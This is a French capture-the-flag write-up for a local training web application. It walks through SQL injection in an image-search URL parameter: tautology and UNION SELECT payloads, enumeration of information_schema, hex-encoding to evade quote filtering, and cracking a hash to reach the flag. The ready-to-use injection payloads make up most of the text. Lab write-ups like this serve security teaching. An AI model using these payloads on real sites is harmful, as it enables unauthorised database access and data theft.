# Image SQL Injection

## Vulnérabilité

On peut faire des injections SQL directement dans l'url pour y recuperer des donnees sensibles

Si on cherche un image number aleatoire, on remarque que le lien est comme suit:

```url
  http://localhost:8080/index.php?page=searchimg&id=1&Submit=Submit#
```

Pour verifier que la page est vulnerable aux SQL injections, on test de remplacer le `id=1` par une commande sql
ici, on va remplacer par une condition qui est toujours vraie : `id = 0 OR NOT 0`, afin d'avoir la liste des toutes les images

```url
  http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0%20OR%200=0
```

On obtiens ainsi les resultats suivant :

```shell
    ID: 0 OR 0=0 
    Title: Nsa
    Url : https://fr.wikipedia.org/wiki/Programme_

    ID: 0 OR 0=0 
    Title: 42 !
    Url : https://fr.wikipedia.org/wiki/Fichier:42

    ID: 0 OR 0=0 
    Title: Google
    Url : https://fr.wikipedia.org/wiki/Logo_de_Go

    ID: 0 OR 0=0 
    Title: Earth
    Url : https://en.wikipedia.org/wiki/Earth#/med

    ID: 0 OR 0=0 
    Title: Hack me ?
    Url : borntosec.ddns.net/images.png
```

Deux conclusions :
1. La page est bien sensible aux injections sql
2. Il faut cibler l'id 5, dont le titre est `Hack me?`

Pour aller plus loin, il faut que l'on recupere le nom des tables. POur cela, on va deja utiliser la fonction SQL `database()` qui renvoie le nom de la base de donnees

```url
    http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0%20UNION%20SELECT%201,%20database()
```

la base de donnees s'appelle `Member_images`

On va ensuite interroger une table speciale appelee information_schema.tables qui contient la liste de toutes les tables

```url
    http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database()
```

on obtiens:

```shell
    ID: 0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database() 
    Title: list_images
    Url : 1
```

On veut ensuite verifier les colonnes contenues dans la table `list_images` obtenue

```url
    http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'list_images'
```

La commande ne marche pas, le site bloque les guillemets ? on utilise alors la valeur Hexadecimal. L'ordinateur comprend que c'est une chaine de caracteres sans avoir besoin de guillemets : `0x6c6973745f696d61676573`

```url
    http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573
```

On obtiens alors les tables suivantes : `id,url,title,comment`

en fouillant dans chacune d'elle, on trouve que comment affiche ceci :

```url
    http://localhost:8080/index.php?page=searchimg&Submit=Submit&id=0 UNION SELECT 1, comment FROM list_images
```

```shell
    ID: 0 UNION SELECT 1, comment FROM list_images 
    Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    Url : 1
```

On suit donc les instructions, le decode md5 donne `albatroz` puis le sha256 donne  le flag `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`


## Prévention

Ne pas utiliser un input brut dans la query sql, et la 'escape' avant 
